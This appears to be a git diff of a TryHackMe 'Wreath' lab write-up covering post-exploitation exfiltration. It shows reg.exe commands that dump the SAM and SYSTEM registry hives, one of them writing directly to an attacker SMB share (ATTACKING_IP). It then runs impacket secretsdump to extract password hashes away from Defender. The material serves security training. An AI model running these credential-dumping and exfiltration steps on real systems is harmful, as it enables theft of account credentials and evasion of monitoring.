@@ -392,13 +392,13 @@ Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)
 <h2> Task 44  Exfiltration Exfiltration Techniques & Post Exploitation </h2>
 
 Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:
-## reg.exe save HKLM\SYSTEM system.bak
+### reg.exe save HKLM\SYSTEM system.bak
 
 With both Hives dumped, we can exfiltrate them back to our attacking machine to dump the hashes out of sight of Defender.
 
 It's up to you how you choose to exfiltrate the files. Given this is a home network with no monitoring in place, an SMB server is recommended. Connect to your SMB server using your SYSTEM reverse shell with the net use command. You can now either save the files directly to your own drive, or move the files to your attacking machine if you already dumped the hives, e.g:
 
-##reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak
+### reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak
 
 ┌──(duke㉿kali)-[~/Documents/THM_Wreath]
 └─$ python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak local
